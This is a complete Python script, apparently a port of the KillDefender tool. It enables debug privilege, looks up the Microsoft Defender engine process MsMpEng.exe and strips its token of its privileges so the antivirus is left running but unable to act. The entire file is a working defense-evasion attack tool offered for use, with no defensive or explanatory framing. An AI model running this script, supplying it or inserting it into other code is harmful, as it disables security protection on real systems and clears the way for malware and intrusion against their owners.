# Based on Pwn1sher's KillDefender: https://github.com/pwn1sher/KillDefender
import wmi
import win32api
import win32process
import win32security


DEBUG_PROCESS = win32process.DEBUG_PROCESS
TOKEN_QUERY = win32security.TOKEN_QUERY
TOKEN_ADJUST_PRIVILEGES = win32security.TOKEN_ADJUST_PRIVILEGES
TOKEN_ALL_ACCESS = win32security.TOKEN_ALL_ACCESS
SE_PRIVILEGE_ENABLED = win32security.SE_PRIVILEGE_ENABLED
SE_PRIVILEGE_REMOVED = win32security.SE_PRIVILEGE_REMOVED

# NT Defined Privileges

SE_CREATE_TOKEN_NAME              = "SeCreateTokenPrivilege"
SE_ASSIGNPRIMARYTOKEN_NAME        = "SeAssignPrimaryTokenPrivilege"
SE_LOCK_MEMORY_NAME               = "SeLockMemoryPrivilege"
SE_INCREASE_QUOTA_NAME            = "SeIncreaseQuotaPrivilege"
SE_UNSOLICITED_INPUT_NAME         = "SeUnsolicitedInputPrivilege"
SE_MACHINE_ACCOUNT_NAME           = "SeMachineAccountPrivilege"
SE_TCB_NAME                       = "SeTcbPrivilege"
SE_SECURITY_NAME                  = "SeSecurityPrivilege"
SE_TAKE_OWNERSHIP_NAME            = "SeTakeOwnershipPrivilege"
SE_LOAD_DRIVER_NAME               = "SeLoadDriverPrivilege"
SE_SYSTEM_PROFILE_NAME            = "SeSystemProfilePrivilege"
SE_SYSTEMTIME_NAME                = "SeSystemtimePrivilege"
SE_PROF_SINGLE_PROCESS_NAME       = "SeProfileSingleProcessPrivilege"
SE_INC_BASE_PRIORITY_NAME         = "SeIncreaseBasePriorityPrivilege"
SE_CREATE_PAGEFILE_NAME           = "SeCreatePagefilePrivilege"
SE_CREATE_PERMANENT_NAME          = "SeCreatePermanentPrivilege"
SE_BACKUP_NAME                    = "SeBackupPrivilege"
SE_RESTORE_NAME                   = "SeRestorePrivilege"
SE_SHUTDOWN_NAME                  = "SeShutdownPrivilege"
SE_DEBUG_NAME                     = "SeDebugPrivilege"
SE_AUDIT_NAME                     = "SeAuditPrivilege"
SE_SYSTEM_ENVIRONMENT_NAME        = "SeSystemEnvironmentPrivilege"
SE_CHANGE_NOTIFY_NAME             = "SeChangeNotifyPrivilege"
SE_REMOTE_SHUTDOWN_NAME           = "SeRemoteShutdownPrivilege"
SE_IMPERSONATE_NAME               = "SeImpersonatePrivilege"

SECURITY_MANDATORY_UNTRUSTED_RID  = 0x2010
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000


def adjust_privilege(priv, enable=1):
    # Get the process token
    flags = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
    htoken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), flags)
    # Get the ID for system shutdown priv
    id = win32security.LookupPrivilegeValue(None, priv)
    # Obtain the privilege for this process
    # Create a list of privileges to be added
    if enable:
        new_privileges = [(id, SE_PRIVILEGE_ENABLED)]
    else:
        new_privileges = [(id, 0)]
    # Make the adjustment
    win32security.AdjustTokenPrivileges(htoken, 0, new_privileges)

def enable_debug_privilege():
    new_privs = (
        (win32security.LookupPrivilegeValue('', SE_DEBUG_NAME),win32security.SE_PRIVILEGE_ENABLED),
        (win32security.LookupPrivilegeValue('', SE_CHANGE_NOTIFY_NAME),win32security.SE_PRIVILEGE_ENABLED),
    )
    ph = win32api.GetCurrentProcess()
    th = win32security.OpenProcessToken(ph, TOKEN_ALL_ACCESS|TOKEN_ADJUST_PRIVILEGES)
    modified_privs = win32security.AdjustTokenPrivileges(th, 0, new_privs)
    win32security.AdjustTokenPrivileges(th, 0, modified_privs)
    print("Debug privileges have been enabled!")

def get_all_processes():
    c = wmi.WMI(find_classes=False)
    procs = []
    for i in c.Win32_Process(["Caption", "ProcessID"]):
        procs.append(i)
    return procs

def get_procid_from_name(processname, proc_list):
    for process in proc_list:
        proc_name = process.wmi_property("Caption").value
        proc_id = process.wmi_property("ProcessID").value
        if proc_name == processname:
            return proc_id
        else:
            continue

def get_pid(process_name):
    processes = get_all_processes()
    pid = get_procid_from_name(process_name, processes)
    return pid

def set_privilege_none(pid):
    # Local Priv, Priv To Lookup, LUID of Priv
    new_privs = (
        (win32security.LookupPrivilegeValue('', SE_SECURITY_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_CHANGE_NOTIFY_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_TCB_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_IMPERSONATE_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_LOAD_DRIVER_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_RESTORE_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_BACKUP_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_SECURITY_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_SYSTEM_ENVIRONMENT_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_INCREASE_QUOTA_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_TAKE_OWNERSHIP_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_INC_BASE_PRIORITY_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_SHUTDOWN_NAME),win32security.SE_PRIVILEGE_REMOVED),
        (win32security.LookupPrivilegeValue('', SE_ASSIGNPRIMARYTOKEN_NAME),win32security.SE_PRIVILEGE_REMOVED),
    )

    ph = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
    print(f"Got handle to Process: {pid}")
    th = win32security.OpenProcessToken(ph, TOKEN_ALL_ACCESS)
    print(f"Got security token of Process: {pid}")
    modified_privs = win32security.AdjustTokenPrivileges(th, 0, new_privs)
    win32security.AdjustTokenPrivileges(th, 0, modified_privs)
    print("Selected process has been stripped of privileges.")
    

def main():
    enable_debug_privilege()
    process_id = get_pid("MsMpEng.exe")
    set_privilege_none(process_id)

if __name__=="__main__":
    main()